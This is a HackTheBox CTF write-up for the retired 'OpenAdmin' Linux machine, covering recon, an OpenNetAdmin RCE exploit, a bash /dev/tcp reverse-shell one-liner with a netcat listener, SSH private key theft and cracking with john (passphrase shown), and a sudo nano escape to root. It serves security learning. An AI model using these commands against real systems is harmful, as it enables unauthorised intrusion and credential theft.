@@ -1,0 +1,121 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox OpenAdmin Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-open-admin-box-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-05-13T18:56:55+00:00">May 13, 2020</time><time class="updated" datetime="2025-06-27T11:46:48+00:00">June 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today, I am going to share a writeup for the boot2root challenge of the HacktheBox machine “OPENADMIN” which is a retired machine. It was actually an easy box based on the Linux machine and recently I have owned this system and got many new things to learn.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Recon </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+<li><span style="color: #000000;">Dirb</span></li>
+<li><span style="color: #000000;">Python script ona-rce.py</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploit</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netcat</span></li>
+<li><span style="color: #000000;">sh</span></li>
+<li><span style="color: #000000;">SSH_Key Brute force</span></li>
+<li><span style="color: #000000;">SSH login</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing Sudo</span></li>
+<li><span style="color: #000000;">Capture the flag</span></li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough </span></h3>
+<h3><span style="color: #800000;">Recon</span></h3>
+<p><span style="color: #000000;">Recon is the act of gathering different kinds of information against the targeted victim or system.  We can use various tools, techniques, and websites for the recon. Such as (Nmap, Dirsearch, Dirb etc) let’s start with Nmap tool.</span></p>
+<p><span style="color: #000000;">We will start our recon by using Nmap scan to find the open ports and the version of our target.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -Pn 10.10.10.171</pre>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-iGrHdj-i7GE/Xrw8Q3LAc_I/AAAAAAAAkAs/VndDjFKH6FAUJf4XmnRzYg9iDBtfDihDQCLcBGAsYHQ/s1600/1.png" alt="OpenAdmin HackTheBox Walkthrough" width="801" height="334"/></span></p>
+<p><span style="color: #000000;">We will also do fuzzing of endpoints using dirbuster tool using the command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.171/</pre>
+<p><span style="color: #000000;">and we got some directories like (artwork, music).</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IospIk-vKWI/Xrw8TxSbwqI/AAAAAAAAkBU/U9bsIVJCtzkqRy6iq1weFZkfIjn21f4KgCLcBGAsYHQ/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">After checking all the directories, we got one web page in which we found the login page.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.10.171/music</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jOwiGg30APQ/Xrw8WP4hCUI/AAAAAAAAkBw/jEygDrOP0JYicP63DajFnZm39qM6shMQwCLcBGAsYHQ/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Coming to the login page, we got the “open net admin” version let’s recon about the “ona”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PMb5ZKpul4Q/Xrw8Wf39jlI/AAAAAAAAkB0/dn62W_d7Ync0C9HFna8W6yjLmh68tYQ3ACLcBGAsYHQ/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">After I did some recon, we got <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/amriunix/ona-rce">exploit</a> </strong></span>for this system and this particular version.</span></p>
+<p><span style="color: #000000;">Let’s download the code for the exploit and see how it works. The usage of this python code is very simple. Firstly, we need to check whether the URL is vulnerable or not and then we can exploit it easily by executing the same code.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 ona-rce.py check http://10.10.10.171/ona/</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-Azn0Zh9QOPA/Xrw8Wntnc6I/AAAAAAAAkB4/dkHY0LhpnwcQGW8wlP7_cWyonALDI6NFACLcBGAsYHQ/s1600/6.png" alt="OpenAdmin HackTheBox Walkthrough" width="656" height="358"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Since we did check for this exploit in the recon part and we got this URL is vulnerable to RCE. Using the below command, we will successfully exploit this URL. and yes, commands are executing successfully.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 ona-rce.py exploit http://10.10.10.171/ona/</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-hRgZkK2mphw/Xrw8W6xqZ_I/AAAAAAAAkB8/I0R7tLEvyHw1VesMcJ_wA_4b0xX_SudhwCLcBGAsYHQ/s1600/7.png"/></strong><strong> </strong></span></p>
+<p><span style="color: #000000;">Yes, we are connected to a remote host and our current user is www-data. Now using netcat listener, we will take the reverse shell from the host to further enumeration of this Linux box.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FrRTnxfeq78/Xrw8XE6tcOI/AAAAAAAAkCA/5Y-f0U3VT8EBSr5JghEVGFYZyq0WXY0ugCLcBGAsYHQ/s1600/8.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
+<p><span style="color: #000000;">Here the connection stabilized successfully.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uA_RwBzJVrk/Xrw8XYxI76I/AAAAAAAAkCE/We2EjRbYr24I5p5Q5B29oCpIx3BSgjKFwCLcBGAsYHQ/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Let’s start the enumeration of this machine. In the same present working directory first will enumerate and see what juicy data is there. Here we got many directories and let’s check first what’s there in the local directory.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-ZUsaymHPZTg/Xrw8RH-cijI/AAAAAAAAkAw/53y19-ydfKYFQeIDCNswf911hvU16yHYACLcBGAsYHQ/s1600/10.png" alt="OpenAdmin HackTheBox Walkthrough" width="563" height="711"/></span></p>
+<p><span style="color: #000000;">After further enumeration in the same directory, we got a one php file “database_settings.inc.php”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NeOOJSY_YX8/Xrw8Qq2kQZI/AAAAAAAAkAo/YmG3222u4w8rnVYedl4UdcWAu4LWJ0TyQCLcBGAsYHQ/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Let’s check what’s there in this php file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HOA7xOAU7r0/Xrw8RcWsdlI/AAAAAAAAkA0/IbFzFiQn_g4cpdcyuQCq21m6LA-2zb0kQCLcBGAsYHQ/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">So here we got some credentials for the database.</span></p>
+<p><span style="color: #000000;">Now let’s check how many users are present in the home directory of this machine. Here we got there are two users present in the machine and that is “Jimmy” and “Joanna”.</span></p>
+<p><span style="color: #000000;">In the process of recon, we have done the port scanning using Nmap scan as we know ssh port 22 is open.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-5gd2fBaABr8/Xrw8R9KFyJI/AAAAAAAAkA4/ar3Tfzt_qfoWF-0R9LbM1xayrrfSHg1lQCLcBGAsYHQ/s1600/13.png" alt="OpenAdmin HackTheBox Walkthrough" width="626" height="168"/></span></p>
+<p><span style="color: #000000;">Let’s try to connect through ssh port for the user jimmy with the above password which we found in the database_settings.inc.php file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh &lt;user&gt;@&lt;ip&gt;</pre>
+<h5><span style="color: #000000;">And yes, we are in 😊</span></h5>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2D8JJEbddig/Xrw8SNztnII/AAAAAAAAkA8/8RGPtso6vY4clJJKBbqwHHFaIhImMozMwCLcBGAsYHQ/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Now we are connected to the jimmy user now for further enumeration we will first go to the “var” directory, it’s always good to enumerate the var directory.  Doing enumeration, we got one directory called /var/www/internal.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_bme4KesKbI/Xrw8SReLn5I/AAAAAAAAkBA/FzY1WMp6St0jaT89-8M472mjrXzfb6HPQCLcBGAsYHQ/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">So here we got main.php in the /var/www/internal directory. now let’s have a look what’s present in the main.php.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tCRob-wLdiE/Xrw8SmMOY7I/AAAAAAAAkBE/ksqE2hc6B0g_A8RYEBf8drv7Gkmc6mudwCLcBGAsYHQ/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Here is one php code which tells us we need to find the location of Joanna’s private ssh key.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-c5bV8IRWyRM/Xrw8S4Dm9SI/AAAAAAAAkBI/jyD2FpmjkbMKJEFyl3jSnSaSbE93EsjfgCLcBGAsYHQ/s1600/17.png" alt="OpenAdmin HackTheBox Walkthrough" width="783" height="243"/></span></p>
+<p><span style="color: #000000;">Then, let’s enumerate more for the location where we can get Joanna’s ssh private key.</span></p>
+<p><span style="color: #000000;">Here we will use <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum.sh</a>,</span> </strong>This bash script is for enumerating the Linux machine to checks which services are running on the machine, privileges access, version information, system information, user information etc.\</span></p>
+<h4><span style="color: #000000;">STEPS</span></h4>
+<ol>
+<li><span style="color: #000000;">Download the script or get the location where this script is stored.</span></li>
+<li><span style="color: #000000;">Host the python server and copy the link of the LinEnum.sh file.</span></li>
+<li><span style="color: #000000;">Download the script in the remote host using “wget” command in the “/var/tmp” directory.</span></li>
+<li><span style="color: #000000;">Change the permission of the LinEnum.sh shell script using “chmod” command.</span></li>
+<li><span style="color: #000000;">Now run the script in the remote machine.</span></li>
+</ol>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./LinEnum.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XOyUWd4JoVQ/Xrw8TfVoiMI/AAAAAAAAkBM/QoAGi66vARgvTPevQ2rBx384bvB4gHKzQCLcBGAsYHQ/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">So here got some information after running the shell script LinEnum.sh</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f2rqQlw444s/Xrw8TjHOt1I/AAAAAAAAkBQ/yE5Ndm8FMWssVC7enG9Q5YXCsp3cEzyUwCLcBGAsYHQ/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Here ports 52846 and 3306 are open and in the listen to state, by using the curl command we will check that which above mention localhost port the main.php is getting executed.  By using the command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl http://127.0.0.1:52846/main.php</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-09az-nwVWx8/Xrw8UVDnQ_I/AAAAAAAAkBY/QMHv5aFvCE02TUrxJYYnp39ULsRB5SPzQCLcBGAsYHQ/s1600/20.png" alt="OpenAdmin HackTheBox Walkthrough" width="683" height="701"/></span></p>
+<p><span style="color: #000000;">Here we successfully retrieve the ssh key using the 52846 port now save this key in your system.</span></p>
+<p><span style="color: #000000;">We got Joanna’s ssh private key. Using this private ssh key we will switch the user jimmy to Joanna. Firstly, we need to convert the private key into a hash using ssh2john.py and hash we can crack by using john the ripper tool. For more reference visit the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/">article</a>.</strong></span></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python /usr/share/john/ssh2john.py id_rsa &gt;&gt; hash.txt
+john –wordlist=/usr/share/wordlists/rockyou.txt hash.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-boOvMXDd9Kc/Xrw8UnIPlzI/AAAAAAAAkBc/YHjMtwRBL-UwRhzt-CyiJGGP76kXWgVfACLcBGAsYHQ/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">Successfully Cracked!! The passphrase is “bloodninjas”.</span></p>
+<p><span style="color: #000000;"><strong>Step 15: </strong> Let’s switch to another user account Joanna. And use the passphrase “bloodninjas”</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i id_rsa joanna@10.10.10.171</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-7hzhNzjD_OU/Xrw8U3un1AI/AAAAAAAAkBg/MG5LnQBRMH87M11H1DRR-GuD7MuEE6-DACLcBGAsYHQ/s1600/22.png" alt="OpenAdmin HackTheBox Walkthrough" width="669" height="730"/></span></p>
+<p><span style="color: #000000;">Yayyy!! 😊  Here we got our user hash for this machine.</span></p>
+<h3><span style="color: #800000;">Privilege Escalation </span></h3>
+<p><span style="color: #000000;">Now moving towards the root flag, here we need to check the permission where user and root do not need a password to access any file throughout the remote machine, using the command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xSwY6v4iiT4/Xrw8VaYKCbI/AAAAAAAAkBk/DKXxm7Hpbmw08j5ygdDNst9R2HY3QgM8wCLcBGAsYHQ/s1600/23.png"/></span></p>
+<p><span style="color: #000000;">Here we got that we can access /bin/nano as root without password.</span></p>
+<p><span style="color: #000000;">Then, let’s do a quick google search on the nano privilege escalation. we can take the shell from <strong><a style="color: #000000;" href="https://gtfobins.github.io/gtfobins/nano/">GTFObins</a></strong>. we can open the /opt/priv file using the nano to escalate to the user to root</span></p>
+<p><span style="color: #000000;">We could escape our shell to root in the nano file. so let’s run the same command as mentioned in the script itself.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">reset; sh 1&gt;&amp;0 2&gt;&amp;0</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-CJlx_DVrpWA/Xrw8VV3_yDI/AAAAAAAAkBo/GG4gQRfog_E6mJf4hUKC4OKhu2kf6r6WQCLcBGAsYHQ/s1600/26.png" alt="OpenAdmin HackTheBox Walkthrough" width="457" height="200"/></span></p>
+<p><span style="color: #000000;">Once we execute the command, we escalate our shell to root.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HM4NTWzB0Gs/Xrw8VhfAXlI/AAAAAAAAkBs/0mrDPdxfwJ4SEAfMFvzbC5Kxi0XU4TKAgCLcBGAsYHQ/s1600/27.png"/></span></p>
+<p><span style="color: #000000;">Here we got our root flag… That explains it all. So that’s for now. See you next time.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!! 😊</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Sushma Ahuja is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <a href="https://www.linkedin.com/in/sushma-ahuja-284907157/"><strong>LinkedIn</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
